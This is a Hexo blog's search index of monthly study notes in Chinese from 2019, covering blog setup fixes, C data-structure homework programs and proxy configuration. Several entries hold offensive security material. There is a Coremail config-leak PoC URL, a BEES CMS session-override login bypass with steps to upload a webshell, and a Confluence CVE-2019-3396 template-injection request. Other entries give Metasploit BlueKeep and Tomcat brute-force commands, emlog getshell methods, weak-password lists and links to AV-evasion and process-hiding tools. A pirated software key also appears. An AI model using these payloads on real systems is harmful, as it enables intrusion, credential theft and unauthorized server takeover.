<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[一九年六月总结]]></title>
    <url>%2F%E4%B8%80%E4%B9%9D%E5%B9%B4%E5%85%AD%E6%9C%88%2F</url>
    <content type="text"><![CDATA[hexo倒腾问题 404页面不能正常显示使用官方给的代码时 123456789101112131415161718&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv="content-type" content="text/html;charset=utf-8;"/&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" /&gt; &lt;meta name="robots" content="all" /&gt; &lt;meta name="robots" content="index,follow"/&gt; &lt;link rel="stylesheet" type="text/css" href="https://qzone.qq.com/gy/404/style/404style.css"&gt;&lt;/head&gt;&lt;body&gt; &lt;script type="text/plain" src="http://www.qq.com/404/search_children.js" charset="utf-8" homePageUrl="/" homePageName="回到我的主页"&gt; &lt;/script&gt; &lt;script src="https://qzone.qq.com/gy/404/data.js" charset="utf-8"&gt;&lt;/script&gt; &lt;script src="https://qzone.qq.com/gy/404/page.js" charset="utf-8"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 本地环境正常显示，不过推到github后就成下图所示了 原因在知乎上看到有人说出现该问题的原因是github个人页强制使用https协议，而上面给的代码是http的，因此无法加载样式表。 解决方法方法1使用购买的域名指向自己的github个人主页，增加CNAME文件，然后调用公益404页面不会出现混合内容那个问题。（还是需要开启https协议！！！！！） 方法2使用以下代码达到相同的效果 ps:返回主页,后面链接改成自己的即可 12345678910&lt;!DOCTYPE html&gt;&lt;html lang="zh-cn"&gt;&lt;head&gt;&lt;meta charset="UTF-8" /&gt;&lt;title&gt;404&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type="text/javascript" src="//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js" homePageName="返回主页" homePageUrl="https://7iny.jxustctf.top"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 参考文章 更换背景我们直接在 NEXT 预留的自定义样式文件 “themes/next/source/css/_custom/custom.styl” 中添加自己的样式即可 为了让背景图平铺窗口我把scheme值改成了Muse 123456789101112131415161718body &#123; background: url(https://raw.githubusercontent.com/N407PengYuYan/img/master/img/index.png); background-size: cover; background-repeat: no-repeat; background-attachment: fixed; background-position: 50% 50%;&#125;// 修改主体透明度.main-inner &#123; background: #fff; opacity: 0.8;&#125;// 修改菜单栏透明度.header-inner &#123; opacity: 0.9;&#125; 参考文章 实用方法win10添加网络打印机控制面板-&gt;查看方式按小图标-&gt;凭据管理器-&gt;添加Windows凭据-&gt;输入网络打印机的IP地址,用户密码-&gt;命令行输入目标IP地址\\xxx.xxx.xx.xxx 参考文章 校园宽带PPPOE拨号路由器登陆选择宽带拨号电信宽带：学号@telecom+密码（默认密码：身份证号后六位）移动宽带：学号@cmcc+密码（默认密码：身份证号后六位）联通宽带：学号@unicom+密码（默认密码：身份证号后六位） 参考文章 免费接码平台123456789101112131415161718192021222324252627282930313233343536373839国内免费接码平台 https://sms.cm https://www.pdflibr.com https://www.becmd.com http://www.smszk.com国外免费接码平台 https://zh.mytrashmobile.com（中文） https://ch.freephonenum.com（中文） SMSReceiveFree：https://smsreceivefree.com Receive SMS Online for FREE：https://www.receive-sms-online.info Receive a SMS Online：https://receive-a-sms.com Free SMS Numbers Online：https://smsnumbersonline.com Receive SMS online for Free：https://sms-online.co/receive-free-sms Receive-SMS：https://receive-sms.com Receive FREE SMS online：http://receivefreesms.com RECEIVE SMS ONLINE：https://www.receivesmsonline.net Free Online Phone：https://www.freeonlinephone.org Receive SMS Online：http://receive-sms-online.com TextNow：https://www.textnow.com Textfree：https://www.pinger.com/text-free/ SELLAITE：http://sms.sellaite.com/ Twilio：https://www.twilio.com/ https://receive-sms.com/ http://receive-sms-online.com/ http://sms.sellaite.com/ http://hs3x.com/ http://receivefreesms.net http://receivesmsonline.in http://www.receive-sms-now.com https://sms-receive.net https://www.receivesms.net http://www.freesmsverifications.com http://receiveonlinesms.biz http://receivesmsverification.com https://www.receivesms.co http://receiveonlinesms.com 参考文章 借助插件科学上网有时候代理会被大面积封锁，可是我们又需要进行学习，那么我们可以用第三方插件来满足我们的搜索需求 Ghelper源码安装chrome插件 1.打开你的Chrome浏览器的 更多工具&gt;扩展程序页面.或者直接在网址输入: chrome://extensions/2.这个页面点击 “添加已解压的扩展程序”3.选择本次下载包里的 ghelper_source 目录4.确认后就行了. 官网下载地址 木马下载asp木马 Coremail 0day 敏感文件泄露漏洞 POC: /mailsms/s?func=ADMIN:appState&amp;dumpConfig=/ 通过域名或者IP等地址+POC即可获取目标邮件服务器配置文件，配置文件包括：文件路径、IP、端口、数据库用户、密码等敏感信息。 参考文章 2.apiws http://host/apiws/services/ http://host/apiws/services/API?wsdl 参考文章 cnvd通告 漏洞CVE-2019-0708影响：该漏洞影响范围较广，windows2003、windows2008、windows2008 R2、windows xp * 系统都会遭到攻击，该服务器漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击的 。CVE-2019-0708漏洞是通过检查用户的身份认证，导致可以绕过认证，不用任何的交互，直接通过rdp协议进行连接发送恶意代码执行命令到服务器中去。 kali依次执行验证 1234msfconsoleuse auxiliary/scanner/rdp/cve_2019_0708_bluekeepset RHOSTS x.x.x.xexploit BEES企业网站管理系统漏洞1.漏洞地址http://host/mx_form/mx_form.php?id=2 1用火狐里面的firebug插件用post参数，覆盖session值，之后便可直接登录后台：_SESSION[login_in]=1&amp;_SESSION[admin]=1&amp;_SESSION[login_time]=100000000000000000000000000000000000 2.执行之后访问http://host/admin/admin.php3.点击内容管理—&gt;上传照片管理—&gt;修改4.上传图片马，用burpsuite拦截将jpg改为php，即可绕过上传限制 CVE-2019-3396漏洞描述中指出Confluence Server与Confluence Data Center中的Widget Connector存在服务端模板注入漏洞，攻击者能利用此漏洞能够实现目录穿越与远程代码执行。 漏洞分析参看文章 Burp Suit复现 123456789101112POST /rest/tinymce/1/macro/preview HTTP/1.1Host: x.x.x.xAccept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeReferer:http://x.x.x.x/pages/resumedraft.action?draftId=786457&amp;draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&amp;Content-Type: application/json; charset=utf-8Content-Length: 168&#123;&quot;contentId&quot;:&quot;786458&quot;,&quot;macro&quot;:&#123;&quot;name&quot;:&quot;widget&quot;,&quot;body&quot;:&quot;&quot;,&quot;params&quot;:&#123;&quot;url&quot;:&quot;https://www.viddler.com/v/23464dc6&quot;,&quot;width&quot;:&quot;1000&quot;,&quot;height&quot;:&quot;1000&quot;,&quot;_template&quot;:&quot;../web.xml&quot;&#125;&#125; 更多功能 参考1 获取shell 工具Github渗透工具资源整合 超级弱口令多线程检查审计工具SNETCracker可快速发现弱密码、弱口令账号，密码支持和用户名结合进行检查，大大提高成功率，支持自定义服务端口和字典。下载地址 Github关键字监测、告警、发现下载地址 AVIator是一个后门生成器实用程序，它使用加密和注入技术来绕过AV检测。下载地址 Vxscan：一款用于渗透测试的多功能扫描工具下载地址 thinkphp v5.x 远程代码执行漏洞-POC集合下载地址 实战中常用工具汇总1.进程隐藏工具libprocesshiderReptile2.流量代理工具proxydog-tunnel3.Linux辅助提权工具LinEnum.shLinEnum4.脏牛提权工具c0w64c0w645.内网流量代理工具agent.exenps]]></content>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一九年五月总结]]></title>
    <url>%2F%E4%B8%80%E4%B9%9D%E5%B9%B4%E4%BA%94%E6%9C%88%2F</url>
    <content type="text"><![CDATA[学习博客1.漏洞挖掘大佬blackwolf的博客 2.mntn0x的博客 Tomcat密码爆破使用Metasploit实现Tomcat密码爆破 1.启动 msfconsole 2.搜索模块 search tomcat 3.调用模块 use auxiliary/scanner/http/tomcat_mgr_login 4.配置 123456配置RHOST,RHOST是目标主机IP&gt; set RHOST X.X.X.X配置RPORT,RPORT是目标主机端口&gt; set RPORT XXXX更改字典：可以通过设定PASS_FILE和USER_FILE配置项的路径进行更改（通常情况默认就行了） 5.运行 run 参考文章 1.Tomcat密码爆破小记 next主题倒腾官方文档:点击进入 报错解决： ENOENT: no such file or directory, open ‘D:\ myBlog\ themes\ next\ layout\ scripts\ schemes. swig’ 原因是配置文件 _config.yml有问题，我这是友情链接：后没空格的原因 参考文章 工具图片在线设计感谢专业大神orangice的指导 在线图片设计fotor:地址 visual studio 2012 安装推荐一个高速下载还提供密钥的站点：点击进入 C-Free 5下载下载网址：点击进入 注册码:用户名：tianfang邮箱：`quart@163.com注册码：2NnUqd3shO2agta0xNjcusfK1LXO` 参考文章 注意事项C-Free 5安装好后记得改文件夹名把中间的空格去掉，否则会报以下错误 [Error] g++.exe: 5\mingw\lib\: No such file or directory [Error] g++.exe: 5\mingw\mingw32\lib\: No such file or directory [Error] g++.exe: 5\mingw\bin\: No such file or directory [Error] g++.exe: 5\mingw\mingw32\bin\: No such file or directory 参考文章 C程序线性表综合题 1.按照输入的顺序建立顺序表2.对顺序表进行排序（直接插入、冒泡、选择、快速、合并)3.按照由大到小的顺序建立一个单链表4.链表逆置5.将顺序表和链表合并成一个有序表。6.结果输出 解题思路和函数调用图参考 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;malloc.h&gt;typedef struct &#123; /*链表节点*/ int data; struct Node *next;&#125;Node;int array[100]; /*线性表用数组存储*/int count; /*顺序表计数器*/int createList (int arr[]) &#123; /*建立顺序表*/ int i; arr[0] = 0; printf("请输入顺序表长度："); scanf("%d", &amp;count); for (i = 1; i &lt;= count; i++) &#123; printf("请输入顺序表第%d节点数据:",i); scanf("%d", &amp;arr[i]); &#125; return 1;&#125;int printList(int arr[]) &#123; /*打印顺序表*/ int i; for (i = 1; i &lt;= count; i++) &#123; /*打印排序结果*/ printf("%d ", arr[i]); &#125; printf("\n"); return 1;&#125;int sort(int arr[]) &#123; /*排序列表*/ int M = 1, N = count, i, ch;/*建立快速，归并排序所需数组*/ int r1[N + 1], r2[N + 1]; for (i = 1; i &lt;= N; i++) &#123; r1[i - 1] = arr[i]; &#125; //system("CLS"); printf("1.直接插入排序\n"); printf("2.冒泡排序\n"); printf("3.直接选择排序\n"); printf("4.快速排序\n"); printf("5.归并排序\n"); printf("请输入你的选择："); scanf("%d", &amp;ch); switch(ch) &#123; case 1:insertSort(arr);break; case 2:bubbleSort(arr);break; case 3:selectionSort(arr);break; case 4:quickSort(arr, M, N);break; case 5:mergeSort(r1, r2, 0, N - 1); for (i = 1; i &lt;= N; i++) &#123; arr[i] = r1[i - 1]; &#125;break; &#125;&#125;int insertSort(int arr[]) &#123; /*直接插入排序*/ int i, j; for (i = 2; i &lt;= count; i++) &#123; arr[0] = arr[i]; /*array[0]作为监督哨*/ j = i - 1; while (arr[0] &lt; arr[j]) &#123; /*从后向前找到第一个关键字不小于arr[0]的记录*/ arr[j + 1] = arr[j]; j--; &#125; arr[j + 1] = arr[0]; &#125; return 1;&#125;int bubbleSort(int arr[]) &#123; /*冒泡排序*/ int i, j, temp; for (i = 1; i &lt;= count; i++) &#123; for (j = 1; j &lt;= count - i; j++) &#123; if (arr[j] &gt; arr[j + 1]) &#123; temp = arr[j + 1]; arr[j + 1] = arr[j]; arr[j] = temp; &#125; &#125; &#125; return 1;&#125;int selectionSort(int arr[]) &#123; /*直接选择排序*/ int i, j, temp, m; for (i = 1; i &lt;= count; i++) &#123; m = i; for (j = i + 1; j &lt;= count; j++) &#123; /*找到最小的数字*/ if(arr[j] &lt; arr[m]) &#123; m = j; &#125; if (i != m) &#123; temp = arr[i]; arr[i] = arr[m]; arr[m] = temp; &#125; &#125; &#125;&#125;int quickSort(int arr[], int M, int N) &#123; /*快速排序*/ int i, j, x; i = M, j = N; x = arr[i]; do &#123; while ((arr[j] &gt;= x) &amp;&amp; (j &gt; i)) &#123; j--; &#125; if (i &lt; j) &#123; arr[i] = arr[j]; i++; while (arr[j] &lt;= x &amp;&amp; (i &lt; j)) &#123; i++; &#125; if (i &lt; j) &#123; arr[j] = arr[i]; j--; &#125; &#125; &#125;while (i != j); arr[i] = x; i++; j--; if (M &lt; j) &#123; quickSort(arr, M ,j); &#125; if (i &lt; N) &#123; quickSort(arr, i, N); &#125;&#125;int merge(int r[], int r2[], int S, int M, int N) &#123; int i,k,j; i = S, k = S, j = M + 1; /*从S开始*/ while ((i != M + 1) &amp;&amp; (j != N + 1)) &#123; /*当两个表都有内容未排完时*/ if (r[i] &gt; r[j]) &#123; r2[k] = r[j]; j++; &#125; else &#123; r2[k] = r [i]; i++; &#125; k++; &#125; while (i != M + 1) &#123; /*将剩下的全部放入*/ r2[k++] = r[i++]; &#125; while (j != N + 1) &#123; r2[k++] = r[j++]; &#125; for (i = S; i &lt;= N; i++) &#123; r[i] = r2[i]; &#125;&#125;int mergeSort(int r[], int r2[], int S, int N) &#123; /*归并排序*/ int M; if (S &lt; N) &#123; M = (S + N)/2; mergeSort(r, r2, S, M); mergeSort(r, r2, M + 1, N); merge(r, r2, S, M, N); &#125;&#125;int createNode(Node *L) &#123; /*建立链表*/ Node *q; int m, n, i; /*节点个数为m，节点数据为n*/ printf("请输入链表节点个数："); scanf("%d", &amp;m); for (i = 0; i &lt; m; i++) &#123; q = (Node*)malloc(sizeof(Node)); printf("请输入第%d节点数据：",i+1); scanf("%d", &amp;n); q -&gt; data = n; L -&gt; next = q; L = q; &#125; L -&gt; next = NULL; /*尾标识为NULL*/ printf("\n"); return 1;&#125;int sortNode(Node *L) &#123; /*对链表节点进行排序，仅交换数据*/ int i, j, tempData; Node *head, *point; /*辅助指针point帮助指向head的下一个节点*/ head = L; head = head -&gt; next; int length = 0; while (head -&gt; next != NULL) &#123; /*计算链表长度*/ head = head -&gt; next; length++; &#125; for (i = 0; i &lt; length; i++) &#123; /*冒泡排序*/ head = L; /*将head复位*/ head = head -&gt; next; for(j = i; j &lt; length; j++) &#123; point = head -&gt; next; if(head -&gt; data &gt;= point -&gt; data) &#123; tempData = head -&gt; data; head -&gt; data = point -&gt; data; point -&gt; data = tempData; &#125; head = head -&gt; next; &#125; &#125; head = L; /*指针回到开头*/ head = head -&gt; next; while (head != NULL) &#123; /*将排序后的线性表显示出来*/ printf("%d ", head -&gt; data); head = head -&gt; next; &#125; printf("\n"); return 1;&#125;int combine(int arr[], Node *L2) &#123; /*结合两张表*/ int a[100]; int i, j, temp; for (i = 1; i &lt;= count; i++) &#123; a[i - 1] = arr[i]; &#125; while (L2 != NULL) &#123; a[count] = L2 -&gt; data; count++; L2=L2-&gt;next; &#125; for (i = 0; i &lt;= count; i++) &#123; for (j = 0; j &lt;= count - i; j++) &#123; if (a[j] &gt; a[j + 1]) &#123; temp = a[j + 1]; a[j + 1] = a[j]; a[j] = temp; &#125; &#125; &#125; for (i = 0; i &lt;count-1; i++) &#123; printf("%d ", a[i]); &#125;&#125;int main() &#123; int choose; Node *L2; L2 = (Node*)malloc(sizeof(Node)); while(1) &#123; printf("1.建立顺序表\n"); createList(array);printList(array); printf("2.顺序表排序\n"); sort(array);printList(array); printf("3.建立链表\n"); createNode(L2); printf("4.逆置链表\n"); sortNode(L2); printf("5.合并顺序表与链表\n"); combine(array,L2); &#125; printf("\n"); &#125; 飞机票预订系统可在同一文件夹下创建Customer.txt文件存储信息。不过用来读取信息不能实现。include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;malloc.h&gt;typedef struct customer &#123; /*乘客结构体*/ char name[20]; int id; int seat; char sex[10]; char goal[10]; char type[1];&#125;Customer;typedef struct list &#123; /*将乘客规划为数组*/ Customer *array[25]; /*最大存放25人*/ int length;&#125;sqList;typedef struct node &#123; /*将飞机规划为链表*/ int number; int input; struct node *next;&#125;Node;int temp1 = 0; /*航班计数器*/int temp2 = 0; /*人数计数器*/int createPlane(Node *L) &#123; /*创建飞机链表*/ int x, y; do &#123; printf("请输入飞机序号(序号为0时输入完毕)："); scanf("%d", &amp;x); if (x != 0) &#123; printf("请输入登机口："); scanf("%d", &amp;y); Node *q; /*定义新节点*/ q = (Node*)malloc(sizeof(Node)); temp1++; q -&gt; number = x; q -&gt; input = y; L -&gt; next = q; L = q; &#125; &#125;while(x != 0); /*飞机序号为0时结束*/ L -&gt; next = NULL; return 1;&#125;int deleteNode(Node *L) &#123; /*删除飞机节点*/ int num; Node *q; q = L; Node *r = q; q = q -&gt; next; printf("请输入要删除的飞机序号（警告该飞机下的乘客全部删除！）："); scanf("%d", &amp;num); while(q != NULL) &#123; if (q -&gt; number == num) &#123; r -&gt; next = q -&gt; next; free(q); temp1--; return 1; &#125; else &#123; q = q -&gt; next; r = r -&gt; next; &#125; &#125; printf("未找到该飞机！"); return 0;&#125;int initSqList (sqList *S) &#123; /*容器初始化*/ S -&gt; length = 0; return 1;&#125;int createSqList (Node *L, sqList *S) &#123; /*构造乘客容器*/ int x, y, i; Node *q; q = L; q = q -&gt; next; printf("请输入乘客所在飞机号："); scanf("%d", &amp;x); while (q != NULL) &#123; if (q -&gt; number == x) &#123; printf("该飞机共有几名乘客:"); scanf("%d", &amp;y); for (i = temp2 + 1; i &lt;= y; i++) &#123; S -&gt; array[i] = createCustomer(i); S -&gt; length ++; temp2++; &#125; return S; &#125; else &#123; q = q -&gt; next; &#125; &#125; printf("未找到该飞机序号！"); return 0;&#125;int createCustomer(int i) &#123; /*创建新乘客*/ Customer *q; q = (Customer*)malloc(sizeof(Customer)); printf("请输入乘客身份识别号："); scanf("%d", &amp;(q -&gt; id)); printf("请输入乘客姓名："); scanf("%s", &amp;(q -&gt; name)); printf("请输入座位号："); scanf("%d", &amp;(q -&gt; seat)); printf("请输入乘客性别："); scanf("%s", &amp;(q-&gt; sex)); printf("请输入目的地："); scanf("%s", &amp;(q -&gt; goal)); printf("请输入舱位种类: "); scanf("%s", &amp;(q -&gt; type)); return q;&#125;int searchPlane(Node *L) &#123; /*搜寻航班*/ int x, y; Node *q; q = L; printf("请输入航班序号："); scanf("%d", &amp;x); while (q != NULL) &#123; if (x == q -&gt; number) &#123; printf("找到该航班！\n"); printf("航班序号：%d, 登机口:%d\n", q -&gt; number, q -&gt; input); return 1; &#125; else &#123; q = q -&gt; next; &#125; &#125; printf("未找到该航班\n"); return 0;&#125;int searchCustomer(Node *L, sqList *S) &#123; /*搜寻乘客*/ int x, y, i; char s; Node *q; q = L; q = q -&gt; next; printf("请输入乘客所在飞机号："); /*检测飞机是否存在*/ scanf("%d", &amp;x); while(q != NULL) &#123; if (q -&gt; number == x) &#123; break; &#125; else &#123; q = q -&gt; next; &#125; &#125; if (q == NULL) &#123; printf("未找到该飞机\n"); return 0; &#125; printf("请输入乘客身份识别号："); scanf("%d", &amp;y); for (i = 1; i &lt;= temp2; i++) &#123; if (y == S -&gt; array[i] -&gt; id) &#123; printf("找到乘客，打印出数据：\n"); printf("乘客姓名：%s\n", S -&gt; array[i] -&gt; name); printf("乘客身份识别号：%d\n", S -&gt; array[i] -&gt; id); printf("乘客座位号：%d\n", S -&gt; array[i] -&gt; seat); printf("乘客目的地: %s\n", S -&gt; array[i] -&gt; goal); printf("舱位种类：%s\n", S -&gt; array[i] -&gt; type); return 1; &#125; &#125; printf("未找到该乘客\n"); return 0;&#125;int reserve(Node *L, sqList *S) &#123; int i; L = L -&gt; next; FILE *fp = NULL; if ((fp = fopen("Customer.txt", "w")) == NULL) &#123; printf("不能打开文件！"); return 0; &#125; fprintf(fp, "%d\n", temp1); fprintf(fp, "%d\n", temp2); while (L != NULL) &#123; /*保存飞机节点*/ fprintf(fp,"%d %d\n", L -&gt; number, L -&gt; input); L = L -&gt; next; &#125; for (i = 1; i &lt;= temp2; i++) &#123; /*保存乘客节点*/ fprintf(fp, "%s %d %d %s %s %s\n", S -&gt; array[i] -&gt; name, S -&gt; array[i] -&gt; id, S -&gt; array[i] -&gt; seat, S -&gt; array[i] -&gt; sex, S -&gt; array[i] -&gt; goal, S -&gt; array[i] -&gt; type); &#125; fprintf(fp, "%d\n", S -&gt; length); fclose(fp); printf("成功完成"); return 1;&#125;int read(Node *L, sqList*S) &#123; FILE *fp = NULL; int i = 0; Node *q; if ((fp = fopen("Customer.txt", "r")) == NULL) &#123; printf("不能打开文件！"); return 0; &#125; fscanf(fp, "%d\n", &amp;temp1); fscanf(fp, "%d\n", &amp;temp2); for (i = 0; i &lt; temp1; i++) &#123; /*读取飞机数据*/ q = (Node*)malloc(sizeof(Node)); fscanf(fp, "%d %d\n", &amp;q -&gt; number, &amp;q -&gt; input); L -&gt; next = q; L = q; &#125; for (i = 1; i &lt;= temp2; i++); &#123; Customer *temp; temp = (Customer*)malloc(sizeof(Customer)); fscanf(fp,"%s %d %d %s %s %s\n", &amp;temp -&gt; name, &amp;temp -&gt; id, &amp;temp -&gt; seat, &amp;temp -&gt; sex, &amp;temp -&gt; goal, &amp;temp -&gt; type); S -&gt; array[i] = temp; &#125; fscanf(fp ,"%d\n", &amp;S -&gt; length); fclose(fp); printf("成功完成"); return 1;&#125;int main() &#123; Node *L; sqList *S; L = (Node*)malloc(sizeof(Node)); S = (sqList*)malloc(sizeof(sqList)); initSqList(&amp;S); int ch; while (1) &#123; printf(" --------飞机票预订系统--------\n"); printf(" 1.创建航班\n"); printf(" 2.创建乘客\n"); printf(" 3.查询航班信息\n"); printf(" 4.查询乘客信息\n"); printf(" 5.保存信息\n"); printf(" 6.读取信息\n"); printf(" 7.删除飞机信息\n"); printf(" 0.退出系统\n"); printf("请输入您的选择:"); scanf("%d", &amp;ch); switch (ch) &#123; case 1:createPlane(&amp;L);break; case 2:S = createSqList(&amp;L, &amp;S);break; case 3:searchPlane(&amp;L);break; case 4:searchCustomer(&amp;L, S);break; case 5:reserve(&amp;L, S);break; case 6:read(&amp;L, &amp;S);break; case 7:deleteNode(&amp;L);break; case 0:exit(0); &#125; &#125;&#125; 源码参考]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一九年四月总结]]></title>
    <url>%2F%E4%B8%80%E4%B9%9D%E5%B9%B4%E5%9B%9B%E6%9C%88%2F</url>
    <content type="text"><![CDATA[一九年四月总结论坛：日本技术论坛:qiita Medium:是一个博客发布平台，由 Twitter 联合创办人埃文·威廉姆斯和比兹·斯通于2012年8月创办。该平台有专业和非专业的贡献者，亦有受雇的编者，是社会新闻报导的例子之一。websec文章 vulnspy:一个带有漏洞复现，漏洞博客的站点，点击访问 chabug团队论坛：点击访问 工具外链转换网站:网站链接 iTunes实现PC到ipad文件传输：百度知道 音乐外链:热门歌曲下载 漏洞查询网站:exploit-db 过狗工具冰蝎:下载地址 电报安卓旧版:下载地址 漏洞讯时系统(xuas)后台漏洞回显后台： /admin/admin_news_pl_view.asp?id=1 列目录漏洞： http://www.xx.com/edit/admin_uploadfile.asp?id=46&amp;dir=../.. 漏洞参考文章 讯时系统(xuas)最新通杀漏洞0day图文说明 讯时后台管理系统v4.9的鸡肋漏洞分析 emblog拿shell思路1.后台爆破试试弱口令 2.上传模板拿shell，模板文件夹中放入木马，路径为content/templates/模板名/木马名 3.上传插件拿shell，插件文件夹中放入木马，路径为content/plugins/模板名/木马名 4.设置那里有个“允许上传的附件类型 ”，加入asp文件类型（emlog限制了添加php的后缀，没把asp的给限制）未验证是否可行 漏洞参考文章 emlog后台拿shell方法合集 emlog后台作者权限SQL注入 针对emlog友情链接插件审计出的SQL注入漏洞 emlog全版本后台GetShell 视频教程 参考文章冰蝎1.冰蝎动态二进制加密过waf并修改自己菜刀过狗 2.冰蝎项目readme 伪造电子邮件以及制造电子邮件炸弹的攻防探讨freebuf文章,作者的个人博客 github学习项目1.“北大图书馆”Github传送门 2.浙大项目传送门3.清华大学共享了计算机系课程资源4.中科大共享了计算机学院的课程资源 5.上海交大共享了14门关于计算机和高数的课程资源 给四月的一些碎碎念四月，慢慢地自己进入了考研复习的状态，但是并没有全身心的投入，以至于瞎搞了这些四月的技术方面的骚操作。博客在四月后到考研结束，骚操作将不会更新。可能会更新一些算法吧，一来是为了复习数据结构，二来是提升一下编程能力。万一复习得不错选了一个有机试的学校呢？ 希望自己不要辜负大学最后一段青春，愿自己如愿以偿。 放下所有无关的东西，好好学习天天向上。]]></content>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一九年三月总结]]></title>
    <url>%2F%E4%B8%80%E4%B9%9D%E5%B9%B4%E4%B8%89%E6%9C%88%2F</url>
    <content type="text"><![CDATA[一九年三月总结渗透学习1.通过已有黑页后面找马，尝试使用弱口令登陆 intext：请于用于非法用途，后果作者概不负责！ 2.学习文章，多见识已有思想。 secwiki:SecWiki官网 先知社区:链接 3.常用弱口令 12345administrator:passwordadmin:12345root:secretguest:guestroot:toor 常看文章25端口渗透：国光可伪造邮件进行钓鱼等 iis短文件名泄露:github的代码感觉危害不大，没利用过 thinkphp 5.0漏洞:命令执行漏洞好好利用可getshell 推荐阅读博客hof的博客 Allesa学姐的博客 老潘的博客]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo搬迁]]></title>
    <url>%2Fhexo%E6%90%AC%E8%BF%81%2F</url>
    <content type="text"><![CDATA[环境之前的博客是在kali上搭建的,开学了旧电脑懒得带自能搬家博客了。 系统：win10 博客安装环境：nodejs、hexo 之前参看本专业大神的博客试着搭建过，后来没成功，但是环境没卸载。当时的参考文章 搬迁网上有通过github的方式进行搬迁，我嫌太麻烦了，就直接从kali上把博客的文件夹拷贝了。1.d盘创建myBlog文件夹2.将文件解压到文件夹下 问题暂时就gulp不能正常使用解决办法：npm install -g gulp 总结先凑合着用，以后发现有什么需要改进的地方再解决 更新： 2019/2/25 写文章TyporaTypora是一个markdown编辑器，之前一直是用admin插件在写文章，听说这款软件不错，于是想试试。 下载地址:官网 PicGoPicGo是一个快捷的图片部署工具 下载安装项目地址帮助文档 配置PicGo支持Github图床，我是参考这篇文章来进行的配置 登陆GitHub新建repo, 命名为img设置好token 访问：https://github.com/settings/tokens 选择generate new token 打勾repo 选择generate token 注意：这个token生成后只会显示一次！ 在PicGo页面根据提示进行填写imagine图片压缩工具，下载：项目地址 软件样式]]></content>
      <categories>
        <category>WEB学习</category>
      </categories>
      <tags>
        <tag>hexo倒腾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali 科学上网]]></title>
    <url>%2F%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%2F</url>
    <content type="text"><![CDATA[kali 科学上网32位的kali貌似没有图形化操作界面的科学上网软件，于是只好使用命令行操作了。 安装终端输入： sudo apt install shadowsocks 编辑帐号密码终端输入： vi /etc/shadowsocks.json 在配置文件中按照下面的格式填写配置信息，也就帐号密码之类的 1234567891011&#123; &quot;server&quot;:&quot;服务器地址&quot;, &quot;server_port&quot;:服务器端口号, &quot;local_address&quot;: &quot;127.0.0.1&quot;, &quot;local_port&quot;:1080, &quot;password&quot;:&quot;密码&quot;, &quot;timeout&quot;:300, &quot;method&quot;:&quot;加密方式&quot;, &quot;fast_open&quot;: true, &quot;workers&quot;: 1&#125; 设置proxychains打开配置文件 vi /etc/proxychains.conf 1.去掉dynamic_chain前面的注释符 2.在最下方，默认是sock4 xxxx xxx改为sock5 127.0.0.1 xxxx （xxxx是自己刚才设定的端口号，也就是上边配置ss时输入的local_port:xxxx） 根据上面的设置此处就应该该为sock5 127.0.0.1:1080 测试代理是否正常 proxyresolv www.target.com 如果出现命令未找到，终端执行 cp /usr/lib/proxychains3/proxyresolv /usr/bin/ 正常情况是没有开代理返回timeout 开启代理开启代理 sslocal -c /etc/shadowsocks.json -d start 转发启动软件 火狐：proxychains firefox 不用了就关闭代理 sslocal -c /etc/shadowsocks.json -d stop 整个安装使用过程比较顺利，这可能和之前使用了ss的一些依赖环境有关 需要关闭火狐再使用转发启动软件]]></content>
      <categories>
        <category>linux学习</category>
      </categories>
      <tags>
        <tag>科学上网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WiFi小结]]></title>
    <url>%2FWiFi%E7%A0%B4%E8%A7%A3%E5%B0%8F%E7%BB%93%2F</url>
